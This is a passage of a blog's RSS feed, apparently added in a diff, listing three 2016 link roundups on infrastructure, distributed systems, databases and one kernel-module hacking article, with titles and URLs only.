+<a target="_blank" href="http://www.nebulaworks.com/blog/2015/12/15/2016-the-year-of-gifee/">http://www.nebulaworks.com/blog/2015/12/15/2016-the-year-of-gifee/</a> - <strong>Google</strong> Infrastructure For Everyone Else <br><br></p>]]></description><link>https://sami.pw/blog/2016-11-24-interesting-stuff-0x03</link><guid isPermaLink="false">https://sami.pw/blog/2016-11-24-interesting-stuff-0x03</guid><pubDate>Thu, 24 Nov 2016 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;https://circleci.com/blog/its-the-future/&quot;&gt;https://circleci.com/blog/its-the-future/&lt;/a&gt; - &quot;It&apos;s The &lt;strong&gt;Future&lt;/strong&gt;&quot; &lt;br&gt;&lt;br&gt;
+&lt;a target=&quot;_blank&quot; href=&quot;https://github.com/yarrick/pingfs&quot;&gt;https://github.com/yarrick/pingfs&lt;/a&gt; - &lt;strong&gt;PingFS&lt;/strong&gt; &lt;br&gt;&lt;br&gt;
+&lt;a target=&quot;_blank&quot; href=&quot;http://www.nebulaworks.com/blog/2015/12/15/2016-the-year-of-gifee/&quot;&gt;http://www.nebulaworks.com/blog/2015/12/15/2016-the-year-of-gifee/&lt;/a&gt; - &lt;strong&gt;Google&lt;/strong&gt; Infrastructure For Everyone Else &lt;br&gt;&lt;br&gt;&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Interesting Stuff 0x02]]></title><description><![CDATA[<p><strong>The HTTP/2 web server</strong> with automatic HTTPS
+<a target="_blank" href="https://caddyserver.com/">https://caddyserver.com/</a><br><br>
+<strong>IPFS</strong> is the Distributed Web
+<a target="_blank" href="https://ipfs.io/">https://ipfs.io</a><br><br>
+<strong>A realtime distributed messaging platform</strong>
+<a target="_blank" href="http://nsq.io/">http://nsq.io/</a><br><br></p>]]></description><link>https://sami.pw/blog/2016-11-21-interesting-stuff-0x02</link><guid isPermaLink="false">https://sami.pw/blog/2016-11-21-interesting-stuff-0x02</guid><pubDate>Mon, 21 Nov 2016 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;strong&gt;The HTTP/2 web server&lt;/strong&gt; with automatic HTTPS
+&lt;a target=&quot;_blank&quot; href=&quot;https://caddyserver.com/&quot;&gt;https://caddyserver.com/&lt;/a&gt;&lt;br&gt;&lt;br&gt;
+&lt;strong&gt;IPFS&lt;/strong&gt; is the Distributed Web
+&lt;a target=&quot;_blank&quot; href=&quot;https://ipfs.io/&quot;&gt;https://ipfs.io&lt;/a&gt;&lt;br&gt;&lt;br&gt;
+&lt;strong&gt;A realtime distributed messaging platform&lt;/strong&gt;
+&lt;a target=&quot;_blank&quot; href=&quot;http://nsq.io/&quot;&gt;http://nsq.io/&lt;/a&gt;&lt;br&gt;&lt;br&gt;&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Interesting Stuff 0x01]]></title><description><![CDATA[<p>"<strong>How Gmail fought spam</strong>"<br>
+<a target="_blank" href="https://moderncrypto.org/mail-archive/messaging/2014/000780.html">https://moderncrypto.org/mail-archive/messaging/2014/000780.html </a> <br><br>
+"<strong>LKM Linux Loadable Kernel Modules</strong>"<br>
+<a target="_blank" href="http://www.ouah.org/LKM_HACKING.html" >http://www.ouah.org/LKM_HACKING.html </a> <br><br>
+"<strong>ScyllaDB -NoSQL</strong>"<br>
+<a href="http://www.scylladb.com"> http://www.scylladb.com/</a><br><br>
+Interesting reading about <strong>Paxos</strong><br>
+<a href="http://hh360.user.srcf.net/blog/2016/08/majority-agreement-is-not-necessary/">http://hh360.user.srcf.net/blog/2016/08/majority-agreement-is-not-necessary/</a>  <br></p>]]></description><link>https://sami.pw/blog/2016-11-19-interesting-links-1</link><guid isPermaLink="false">https://sami.pw/blog/2016-11-19-interesting-links-1</guid><pubDate>Sat, 19 Nov 2016 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&quot;&lt;strong&gt;How Gmail fought spam&lt;/strong&gt;&quot;&lt;br&gt;
+&lt;a target=&quot;_blank&quot; href=&quot;https://moderncrypto.org/mail-archive/messaging/2014/000780.html&quot;&gt;https://moderncrypto.org/mail-archive/messaging/2014/000780.html &lt;/a&gt; &lt;br&gt;&lt;br&gt;
+&quot;&lt;strong&gt;LKM Linux Loadable Kernel Modules&lt;/strong&gt;&quot;&lt;br&gt;
+&lt;a target=&quot;_blank&quot; href=&quot;http://www.ouah.org/LKM_HACKING.html&quot; &gt;http://www.ouah.org/LKM_HACKING.html &lt;/a&gt; &lt;br&gt;&lt;br&gt;
+&quot;&lt;strong&gt;ScyllaDB -NoSQL&lt;/strong&gt;&quot;&lt;br&gt;
+&lt;a href=&quot;http://www.scylladb.com&quot;&gt; http://www.scylladb.com/&lt;/a&gt;&lt;br&gt;&lt;br&gt;
+Interesting reading about &lt;strong&gt;Paxos&lt;/strong&gt;&lt;br&gt;
+&lt;a href=&quot;http://hh360.user.srcf.net/blog/2016/08/majority-agreement-is-not-necessary/&quot;&gt;http://hh360.user.srcf.net/blog/2016/08/majority-agreement-is-not-necessary/&lt;/a&gt;  &lt;br&gt;&lt;/p&gt;</content:encoded></item></channel></rss>
